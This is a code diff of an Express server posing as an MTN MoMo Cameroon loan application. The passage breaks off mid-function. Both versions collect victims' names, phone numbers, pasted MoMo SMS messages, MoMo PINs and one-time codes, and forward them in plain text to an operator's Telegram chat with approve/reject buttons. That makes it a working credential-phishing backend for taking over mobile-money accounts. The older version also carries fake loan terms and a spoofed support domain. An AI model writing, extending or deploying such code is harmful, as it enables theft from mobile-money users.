@@ -1,798 +1,252 @@
-'use strict';
-
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const crypto = require('crypto');
-const jwt = require('jsonwebtoken');
-const cookieParser = require('cookie-parser');
-const helmet = require('helmet');
-const compression = require('compression');
-const morgan = require('morgan');
-const rateLimit = require('express-rate-limit');
-const PDFDocument = require('pdfkit');
-
-const { pool, initSchema } = require('./db');
-const { sendOtpEmail, sendApprovalEmail } = require('./email');
 
 const app = express();
-app.set('trust proxy', 1);
+app.use(cors());
+app.use(express.json());
 
-app.use(helmet({
-    contentSecurityPolicy: {
-        directives: {
-            defaultSrc: ["'self'"],
-            scriptSrc: ["'self'", "'unsafe-inline'"],
-            scriptSrcAttr: ["'unsafe-inline'"],
-            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
-            styleSrcAttr: ["'unsafe-inline'"],
-            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
-            imgSrc: ["'self'", "data:", "blob:"],
-            connectSrc: ["'self'"],
-            objectSrc: ["'none'"],
-            frameAncestors: ["'none'"]
-        }
-    },
-    crossOriginEmbedderPolicy: false,
-    crossOriginResourcePolicy: { policy: 'same-site' }
-}));
-app.use(compression());
-app.use(morgan('combined'));
-app.use(cors({ origin: true, credentials: true }));
-app.use(express.json({ limit: '1mb' }));
-app.use(cookieParser());
-app.use(express.static(path.join(__dirname, '../frontend')));
+const frontendPath = path.join(__dirname, '../frontend');
+app.use(express.static(frontendPath));
 
 const PORT = process.env.PORT || 3000;
-const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;
-const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret-change-me';
-const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TG_CHAT = process.env.TELEGRAM_CHAT_ID;
-const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
-const IS_DEV = process.env.NODE_ENV !== 'production';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-const OTP_EXPIRY_MIN = parseInt(process.env.OTP_EXPIRY_MINUTES || '10');
-const OTP_COOLDOWN = parseInt(process.env.OTP_RESEND_COOLDOWN_SECONDS || '120');
-const OTP_MAX_ATTEMPTS = 5;
-const SESSION_DAYS = 30;
+const applications = {};
 
-// ─── Rate limiters ───
-const globalLimiter = rateLimit({
-    windowMs: 15 * 60 * 1000, max: 500,
-    standardHeaders: true, legacyHeaders: false
-});
-const applyLimiter = rateLimit({
-    windowMs: 60 * 60 * 1000, max: 10,
-    keyGenerator: r => (r.body && r.body.email) || r.ip,
-    message: { ok: false, error: 'Trop de tentatives.' }
-});
-const checkLimiter = rateLimit({
-    windowMs: 60 * 60 * 1000, max: 20,
-    keyGenerator: r => (r.body && r.body.email) || r.ip,
-    message: { ok: false, error: 'Trop de vérifications.' }
-});
-const cooldownLimiter = rateLimit({
-    windowMs: OTP_COOLDOWN * 1000, max: 1,
-    keyGenerator: r => (r.body && (r.body.sessionToken || r.body.applicationId)) || r.ip,
-    message: { ok: false, error: `Veuillez patienter ${Math.floor(OTP_COOLDOWN / 60)} min.` }
-});
-app.use('/api/', globalLimiter);
-
-// ─── Helpers ───
-function newAppId() { return 'MTN-CM-' + crypto.randomBytes(4).toString('hex').toUpperCase(); }
-function newToken(bytes = 32) { return crypto.randomBytes(bytes).toString('hex'); }
-function newOtp() { return String(crypto.randomInt(100000, 999999)); }
-function hashOtp(otp) { return crypto.createHash('sha256').update(String(otp)).digest('hex'); }
-
-// Pin hashing with Node's PBKDF2 (no pgcrypto)
-function hashPin(pin) {
-    const salt = crypto.randomBytes(16).toString('hex');
-    const hash = crypto.pbkdf2Sync(String(pin), salt, 10000, 64, 'sha512').toString('hex');
-    return `pbkdf2$${salt}$${hash}`;
-}
-function verifyPin(pin, stored) {
-    if (!stored || stored.indexOf('pbkdf2$') !== 0) return false;
-    const parts = stored.split('$');
-    if (parts.length !== 3) return false;
-    const salt = parts[1], expected = parts[2];
-    const actual = crypto.pbkdf2Sync(String(pin), salt, 10000, 64, 'sha512').toString('hex');
-    try {
-        return crypto.timingSafeEqual(Buffer.from(actual, 'hex'), Buffer.from(expected, 'hex'));
-    } catch (e) { return false; }
+function generateRef() {
+  return Math.random().toString(36).substring(2, 8).toUpperCase();
 }
 
-function esc(t) { return String(t == null ? '' : t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
-function code(t) { return '<code>' + esc(t) + '</code>'; }
-function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
-function xaf(n) { return 'XAF ' + fmt(n); }
-function normPhone(p) { return String(p || '').replace(/\D/g, '').replace(/^237/, '').slice(0, 9); }
-function maskEmail(e) {
-    if (!e || e.indexOf('@') < 0) return '***';
-    const parts = e.split('@');
-    return parts[0].slice(0, 2) + '***@' + parts[1];
-}
-function maskPhone(p) {
-    if (!p || p.length < 4) return '***';
-    return p.slice(0, 2) + '***' + p.slice(-3);
-}
-
-// ─── Session ───
-function issueSession(res, appId) {
-    const token = jwt.sign({ id: appId }, SESSION_SECRET, { expiresIn: SESSION_DAYS + 'd' });
-    res.cookie('momo_session', token, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: SESSION_DAYS * 24 * 3600 * 1000,
-        path: '/'
+async function sendTelegramMessage(message, buttons = null) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
+  if (buttons) body.reply_markup = { inline_keyboard: buttons };
+  try {
+    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
     });
-}
-function readSession(req) {
-    try {
-        const raw = req.cookies && req.cookies.momo_session;
-        return raw ? jwt.verify(raw, SESSION_SECRET) : null;
-    } catch (e) { return null; }
-}
-function requireSession(req, res, next) {
-    const s = readSession(req);
-    if (!s) return res.status(401).json({ ok: false, error: 'Session requise.' });
-    pool.query(`SELECT * FROM applications WHERE id = $1`, [s.id])
-        .then(({ rows }) => {
-            if (!rows.length) return res.status(401).json({ ok: false, error: 'Session invalide.' });
-            req.appRow = rows[0];
-            next();
-        })
-        .catch(e => {
-            console.error('requireSession:', e.message);
-            res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-        });
+    const data = await response.json();
+    if (!data.ok) console.error('Telegram API error:', data);
+    else console.log('✅ Telegram message sent');
+  } catch (e) {
+    console.error('Telegram send error:', e);
+  }
 }
 
-// ─── Telegram ───
-async function tgSend(text, buttons) {
-    if (!TG_TOKEN || !TG_CHAT) return;
-    try {
-        const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
-        if (buttons) body.reply_markup = { inline_keyboard: buttons };
-        const r = await fetch(`${TG_API}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
-        });
-        const j = await r.json();
-        if (!j.ok) console.error('TG:', j.description);
-        else console.log(`✅ TG sent (${j.result.message_id})`);
-    } catch (e) { console.error('TG:', e.message); }
-}
+// ─── Health ───
+app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-function askApproval(step, app_) {
-    const buttons = [[
-        { text: '✅ APPROVE', callback_data: JSON.stringify({ a: 'Y', s: step, id: app_.id }) },
-        { text: '❌ REJECT', callback_data: JSON.stringify({ a: 'N', s: step, id: app_.id }) }
-    ]];
-    const header = `🆔 ${code(app_.id)}\n👤 ${esc(app_.full_name)}\n📧 ${code(app_.email)}\n📱 ${code('+237 ' + app_.phone)}\n`;
-    let body = '';
+// ─── Submit Application ───
+app.post('/api/send-application', async (req, res) => {
+  const data = req.body.applicationData;
+  const appId = `${data.phone}_${Date.now()}`;
+  const ref = generateRef();
 
-    if (step === 'application') {
-        const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
-        body = `📋 <b>STEP 1/4 — LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n💰 <b>${xaf(app_.loan_amount)}</b> · ${app_.loan_term} months\n` +
-            `📊 Monthly: <b>${xaf(monthly)}</b>\n🎯 ${esc(app_.loan_purpose)}\n\n` +
-            `💼 ${esc(app_.employment)} · ${xaf(app_.annual_income)}/yr\n` +
-            `👥 Kin: ${esc(app_.kin_name)} ${code('+237 ' + app_.kin_phone)}\n` +
-            `📊 20%: ${app_.has_20_percent ? '✅' : '❌'} · 📜 T&C: ✅\n\n` +
-            `<b>Approve to move to SMS step?</b>`;
-    } else if (step === 'sms') {
-        body = `📩 <b>STEP 2/4 — SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>SMS pasted by user:</b>\n<pre>${esc(app_.sms_content || '')}</pre>\n` +
-            `<b>Approve SMS to move to PIN?</b>`;
-    } else if (step === 'pin') {
-        body = `🔐 <b>STEP 3/4 — MoMo PIN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>PIN entered:</b> <code>${esc(app_.momo_pin_entered || '')}</code>\n\n` +
-            `<b>Approve PIN to move to OTP?</b>`;
-    } else if (step === 'otp') {
-        body = `🔢 <b>STEP 4/4 — OTP</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>OTP entered:</b> <code>${esc(app_.otp_entered || '')}</code>\n\n` +
-            `<b>Approve OTP to finalize the loan?</b>`;
-    }
-    tgSend(body, buttons);
-}
+  applications[appId] = {
+    ...data,
+    ref,
+    smsStatus: 'pending',
+    pinStatus: 'pending',
+    otpStatus: 'pending',
+    pinAttempts: 0,
+    maxPinAttempts: 3,
+    pinBlockedUntil: null,
+    createdAt: new Date().toISOString()
+  };
 
-async function sendSms(to, text) {
-    const url = process.env.SMS_GATEWAY_URL;
-    const key = process.env.SMS_GATEWAY_API_KEY;
-    if (!url || !key) { console.log(`[SMS SIM] +237${to}: ${text}`); return; }
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'x-api-key': key },
-            body: JSON.stringify({ to: '+237' + to, text })
-        });
-        console.log(`✅ SMS → +237${to}`);
-    } catch (e) { console.error('SMS:', e.message); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// HEALTH & CONFIG
-// ═══════════════════════════════════════════════════════════
-app.get('/health', async (req, res) => {
-    try { await pool.query('SELECT 1'); res.json({ ok: true, version: '3.0.2' }); }
-    catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+  const message = `NEW LOAN APPLICATION (CAMEROON)\nID: ${appId}\nPhone: +237${data.phone}\nAmount: XAF ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject the SMS step:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
+  ]];
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, applicationId: appId, status: 'waiting_sms' });
 });
 
-app.get('/api/config', (req, res) => {
-    res.json({
-        ok: true, country: 'CM', currency: 'XAF',
-        minLoan: 500000, maxLoan: 5000000,
-        interestRate: 24, termOptions: [6, 12, 18, 24, 48],
-        requiredTxPercent: 20,
-        otpResendCooldownSeconds: OTP_COOLDOWN,
-        supportPhone: '111', supportEmail: 'support@mtn-momo-cm.com'
+// ─── Send / Resend SMS ───
+app.post('/api/send-momo-message', async (req, res) => {
+  const { applicationId, phone, momoMessage } = req.body.momoData;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.momoMessage = momoMessage;
+  app.smsStatus = 'pending';
+
+  const message = `SMS VERIFICATION (CAMEROON)\nID: ${applicationId}\nPhone: +237${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
+  ]];
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true });
+});
+
+app.post('/api/resend-sms', async (req, res) => {
+  const { applicationId } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.smsStatus = 'pending';
+  const message = `SMS RESUBMITTED (CAMEROON)\nID: ${applicationId}\nMessage:\n${app.momoMessage || '(empty)'}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
+  ]];
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true });
+});
+
+// ─── Send PIN ───
+app.post('/api/send-pin', async (req, res) => {
+  const { applicationId, pin } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
+    const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
+    return res.status(429).json({
+      ok: false,
+      blocked: true,
+      message: `PIN blocked. Try again in ${Math.ceil(remaining / 60)} minutes.`
     });
+  }
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
+    app.pinAttempts = 0;
+    app.pinBlockedUntil = null;
+  }
+
+  app.pin = pin;
+  app.pinStatus = 'pending';
+
+  const message = `PIN VERIFICATION (CAMEROON)\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
+  ]];
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true });
 });
 
-app.get('/api/terms', (req, res) => {
-    res.json({ ok: true, text: `MTN MOMO CAMEROON — LOAN TERMS & CONDITIONS v1.0
+// ─── Send OTP ───
+app.post('/api/send-otp', async (req, res) => {
+  const { applicationId, otp } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-1. ELIGIBILITY
-   • 18+ years old
-   • Active MTN MoMo Cameroon account
-   • At least 20% of the loan amount in MoMo transactions this month
-   • Valid next of kin
-   • Verified email and phone
+  app.otp = otp;
+  app.otpStatus = 'pending';
 
-2. MOMO TERMS OF USE
-   You agree to the MTN Mobile Money Terms of Service (Cameroon),
-   MTN Privacy Policy, and MTN MoMo Fee Schedule.
-   Full terms: https://www.mtn.cm/momo
-
-3. DISBURSEMENT
-   Approved loans are deposited to your MoMo wallet within 5 minutes.
-   You will receive a confirmation SMS and a detailed email.
-
-4. REPAYMENT
-   Monthly instalments as agreed. Automatic deductions from MoMo wallet.
-   Early repayment allowed without penalty.
-   Late payments attract 5% penalty per month.
-
-5. DEFAULT
-   Failure to repay within 30 days triggers default.
-   Legal action may be taken. Negative credit bureau listing.
-
-6. DATA PROTECTION
-   Processed per Law No. 2010/012 on Cybersecurity in Cameroon.
-
-7. COOLING-OFF
-   You may cancel within 5 business days of approval without penalty.
-
-8. DISPUTE RESOLUTION
-   Governed by Cameroonian law. COBAC / National Consumer Tribunal.
-   Contact: support@mtn-momo-cm.com
-
-© 2026 MTN Mobile Money Cameroon` });
+  const message = `OTP VERIFICATION (CAMEROON)\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
+  ]];
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true });
 });
 
-// ═══════════════════════════════════════════════════════════
-// APPLICATION — create and route to admin
-// ═══════════════════════════════════════════════════════════
-app.post('/api/apply', applyLimiter, async (req, res) => {
-    try {
-        const b = req.body || {};
-        const fullName = String(b.fullName || '').trim();
-        const email = String(b.email || '').trim().toLowerCase();
-        const phone = normPhone(b.phone);
-        const momoPin = String(b.momoPin || '').trim();
-        const loanType = String(b.loanType || '').trim();
-        const loanAmount = Number(b.loanAmount);
-        const loanTerm = Number(b.loanTerm);
-        const loanPurpose = String(b.loanPurpose || '').trim();
-        const employment = String(b.employment || '').trim();
-        const annualIncome = Number(b.annualIncome);
-        const kinName = String(b.kinName || '').trim();
-        const kinPhone = normPhone(b.kinPhone);
+// ─── Status check (for polling) ───
+app.get('/api/status/:applicationId/:step', (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-        if (fullName.length < 3) return res.status(400).json({ ok: false, error: 'Nom complet requis.' });
-        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Email invalide.' });
-        if (!/^\d{9}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone à 9 chiffres.' });
-        if (!/^\d{5}$/.test(momoPin)) return res.status(400).json({ ok: false, error: 'Code PIN MoMo à 5 chiffres.' });
-        if (!loanType) return res.status(400).json({ ok: false, error: 'Type de prêt requis.' });
-        if (loanAmount < 500000 || loanAmount > 5000000) return res.status(400).json({ ok: false, error: 'Montant XAF 500,000–5,000,000.' });
-        if (![6, 12, 18, 24, 48].includes(loanTerm)) return res.status(400).json({ ok: false, error: 'Durée invalide.' });
-        if (!loanPurpose) return res.status(400).json({ ok: false, error: 'Objet requis.' });
-        if (!employment) return res.status(400).json({ ok: false, error: 'Emploi requis.' });
-        if (annualIncome <= 0) return res.status(400).json({ ok: false, error: 'Revenu annuel requis.' });
-        if (kinName.length < 2) return res.status(400).json({ ok: false, error: 'Nom du proche requis.' });
-        if (!/^\d{9}$/.test(kinPhone)) return res.status(400).json({ ok: false, error: 'Téléphone du proche invalide.' });
-        if (b.has20Percent !== true) return res.status(400).json({ ok: false, error: 'Vous devez confirmer la règle des 20 %.' });
-        if (b.tncAccepted !== true) return res.status(400).json({ ok: false, error: 'Vous devez accepter les Conditions.' });
+  let status = 'pending';
+  let remainingAttempts = null;
+  let blocked = false;
 
-        const dup = await pool.query(
-            `SELECT id FROM applications
-             WHERE (email = $1 OR phone = $2)
-               AND status NOT IN ('approved', 'rejected') LIMIT 1`,
-            [email, phone]
-        );
-        if (dup.rows.length) {
-            return res.status(400).json({
-                ok: false, code: 'ALREADY_APPLIED',
-                error: 'Une demande est déjà en cours avec ces informations.',
-                applicationId: dup.rows[0].id
-            });
-        }
+  if (req.params.step === 'sms') status = app.smsStatus;
+  else if (req.params.step === 'pin') {
+    status = app.pinStatus;
+    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
+    blocked = app.pinStatus === 'blocked' ||
+      (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
+  } else if (req.params.step === 'otp') status = app.otpStatus;
 
-        const id = newAppId();
-        const pinHash = hashPin(momoPin);
-
-        await pool.query(
-            `INSERT INTO applications (
-                id, full_name, email, phone, momo_pin_hash,
-                loan_type, loan_amount, loan_term, loan_purpose,
-                employment, annual_income, kin_name, kin_phone,
-                has_20_percent, tnc_accepted_at,
-                status, user_submitted
-            ) VALUES (
-                $1, $2, $3, $4, $5,
-                $6, $7, $8, $9, $10, $11, $12, $13,
-                $14, NOW(), 'application_review', TRUE
-            )`,
-            [id, fullName, email, phone, pinHash,
-             loanType, loanAmount, loanTerm, loanPurpose,
-             employment, annualIncome, kinName, kinPhone,
-             true]
-        );
-
-        console.log(`✅ Application ${id} created for ${email}`);
-
-        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        await askApproval('application', full.rows[0]);
-
-        res.json({ ok: true, applicationId: id });
-    } catch (e) {
-        console.error('/api/apply:', e.message, e.stack);
-        res.status(500).json({ ok: false, error: IS_DEV ? ('Erreur: ' + e.message) : 'Erreur serveur.' });
-    }
+  res.json({ ok: true, status, remainingAttempts, blocked });
 });
 
-// GET application state — auto-issues session when approved
-app.get('/api/application/:id', async (req, res) => {
-    try {
-        const { rows } = await pool.query(
-            `SELECT id, status, user_submitted, email, phone, full_name,
-                    loan_amount, loan_term, rejection_reason
-             FROM applications WHERE id = $1`,
-            [req.params.id]
-        );
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-
-        const app_ = rows[0];
-
-        // Auto-issue session if approved and no session currently set
-        if (app_.status === 'approved') {
-            const existing = readSession(req);
-            if (!existing || existing.id !== app_.id) {
-                issueSession(res, app_.id);
-                console.log(`🔑 Session auto-issued for approved app ${app_.id}`);
-            }
-        }
-
-        res.json({ ok: true, ...app_ });
-    } catch (e) {
-        console.error('/api/application/:id:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-// Submit SMS
-app.post('/api/application/submit-sms', async (req, res) => {
-    try {
-        const id = String((req.body || {}).applicationId || '');
-        const sms = String((req.body || {}).sms || '').trim();
-        if (!id || !sms) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
-        if (sms.length < 10 || sms.length > 2000) return res.status(400).json({ ok: false, error: 'SMS invalide.' });
-
-        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'sms_pending') {
-            return res.status(400).json({ ok: false, error: 'Étape SMS non attendue (statut: ' + rows[0].status + ').' });
-        }
-
-        await pool.query(
-            `UPDATE applications SET sms_content = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
-            [id, sms]
-        );
-        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        await askApproval('sms', full.rows[0]);
-        res.json({ ok: true });
-    } catch (e) {
-        console.error('submit-sms:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-// Submit PIN
-app.post('/api/application/submit-pin', async (req, res) => {
-    try {
-        const id = String((req.body || {}).applicationId || '');
-        const pin = String((req.body || {}).pin || '').trim();
-        if (!id || !/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN à 5 chiffres requis.' });
-
-        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'pin_pending') {
-            return res.status(400).json({ ok: false, error: 'Étape PIN non attendue.' });
-        }
-
-        await pool.query(
-            `UPDATE applications SET momo_pin_entered = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
-            [id, pin]
-        );
-        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        await askApproval('pin', full.rows[0]);
-        res.json({ ok: true });
-    } catch (e) {
-        console.error('submit-pin:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-// Submit OTP
-app.post('/api/application/submit-otp', async (req, res) => {
-    try {
-        const id = String((req.body || {}).applicationId || '');
-        const otp = String((req.body || {}).otp || '').trim();
-        if (!id || !/^\d{4,6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'OTP à 4–6 chiffres.' });
-
-        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'otp_pending') {
-            return res.status(400).json({ ok: false, error: 'Étape OTP non attendue.' });
-        }
-
-        await pool.query(
-            `UPDATE applications SET otp_entered = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
-            [id, otp]
-        );
-        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        await askApproval('otp', full.rows[0]);
-        res.json({ ok: true });
-    } catch (e) {
-        console.error('submit-otp:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-// CHECK STATUS — email + phone → OTP by email → PIN
-// ═══════════════════════════════════════════════════════════
-app.post('/api/check-status/start', checkLimiter, async (req, res) => {
-    try {
-        const email = String((req.body || {}).email || '').trim().toLowerCase();
-        const phone = normPhone((req.body || {}).phone);
-        if (!email || !phone) return res.status(400).json({ ok: false, error: 'Email et téléphone requis.' });
-
-        const { rows } = await pool.query(
-            `SELECT id, email, full_name FROM applications
-             WHERE LOWER(email) = $1 AND phone = $2 LIMIT 1`,
-            [email, phone]
-        );
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Aucune demande trouvée avec ces informations.' });
-
-        const app_ = rows[0];
-        const otp = newOtp();
-        const token = newToken(32);
-
-        await pool.query(
-            `INSERT INTO check_status_otps (token, application_id, otp_hash, expires_at)
-             VALUES ($1, $2, $3, NOW() + INTERVAL '${OTP_EXPIRY_MIN} minutes')`,
-            [token, app_.id, hashOtp(otp)]
-        );
-
-        await sendOtpEmail({ to: app_.email, name: app_.full_name, otp, purpose: 'check-status' });
-
-        res.json({
-            ok: true,
-            sessionToken: token,
-            emailMasked: maskEmail(app_.email),
-            phoneMasked: maskPhone(phone)
-        });
-    } catch (e) {
-        console.error('/check-status/start:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-app.post('/api/check-status/verify-otp', async (req, res) => {
-    try {
-        const token = String((req.body || {}).sessionToken || '');
-        const otp = String((req.body || {}).otp || '').trim();
-        if (!token || !/^\d{6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'Code à 6 chiffres requis.' });
-
-        const { rows } = await pool.query(
-            `SELECT * FROM check_status_otps WHERE token = $1 AND expires_at > NOW()`,
-            [token]
-        );
-        if (!rows.length) return res.status(400).json({ ok: false, error: 'Session expirée.' });
-        const s = rows[0];
-        if (s.verified) return res.json({ ok: true, next: 'pin' });
-        if (s.attempts >= OTP_MAX_ATTEMPTS) return res.status(429).json({ ok: false, error: 'Trop de tentatives.' });
-
-        if (s.otp_hash !== hashOtp(otp)) {
-            await pool.query(`UPDATE check_status_otps SET attempts = attempts + 1 WHERE token = $1`, [token]);
-            const left = OTP_MAX_ATTEMPTS - s.attempts - 1;
-            return res.status(400).json({ ok: false, error: `Code incorrect. ${left} tentative(s).` });
-        }
-
-        await pool.query(`UPDATE check_status_otps SET verified = TRUE WHERE token = $1`, [token]);
-        res.json({ ok: true, next: 'pin' });
-    } catch (e) {
-        console.error('verify-otp:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-app.post('/api/check-status/resend-otp', cooldownLimiter, async (req, res) => {
-    try {
-        const token = String((req.body || {}).sessionToken || '');
-        if (!token) return res.status(400).json({ ok: false, error: 'Session manquante.' });
-
-        const { rows } = await pool.query(`SELECT * FROM check_status_otps WHERE token = $1`, [token]);
-        if (!rows.length) return res.status(404).json({ ok: false, error: 'Session introuvable.' });
-
-        const appR = await pool.query(`SELECT email, full_name FROM applications WHERE id = $1`, [rows[0].application_id]);
-        if (!appR.rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });
-
-        const otp = newOtp();
-        await pool.query(
-            `UPDATE check_status_otps
-             SET otp_hash = $1, expires_at = NOW() + INTERVAL '${OTP_EXPIRY_MIN} minutes',
-                 attempts = 0, verified = FALSE, last_sent_at = NOW()
-             WHERE token = $2`,
-            [hashOtp(otp), token]
-        );
-        await sendOtpEmail({ to: appR.rows[0].email, name: appR.rows[0].full_name, otp, purpose: 'check-status' });
-        res.json({ ok: true });
-    } catch (e) {
-        console.error('resend-otp:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-app.post('/api/check-status/verify-pin', async (req, res) => {
-    try {
-        const token = String((req.body || {}).sessionToken || '');
-        const pin = String((req.body || {}).pin || '').trim();
-        if (!token || !/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN à 5 chiffres requis.' });
-
-        const { rows } = await pool.query(
-            `SELECT * FROM check_status_otps WHERE token = $1 AND expires_at > NOW()`,
-            [token]
-        );
-        if (!rows.length || !rows[0].verified) return res.status(400).json({ ok: false, error: 'OTP non vérifié.' });
-
-        const appId = rows[0].application_id;
-        const appR = await pool.query(`SELECT id, momo_pin_hash FROM applications WHERE id = $1`, [appId]);
-        if (!appR.rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });
-
-        if (!verifyPin(pin, appR.rows[0].momo_pin_hash)) {
-            return res.status(401).json({ ok: false, error: 'Code PIN MoMo incorrect.' });
-        }
-
-        await pool.query(`DELETE FROM check_status_otps WHERE token = $1`, [token]);
-        issueSession(res, appId);
-        res.json({ ok: true });
-    } catch (e) {
-        console.error('verify-pin:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-// SESSION & DASHBOARD
-// ═══════════════════════════════════════════════════════════
-app.get('/api/session', (req, res) => {
-    const s = readSession(req);
-    if (!s) return res.json({ ok: true, loggedIn: false });
-    pool.query(`SELECT id, full_name, email, phone, status FROM applications WHERE id = $1`, [s.id])
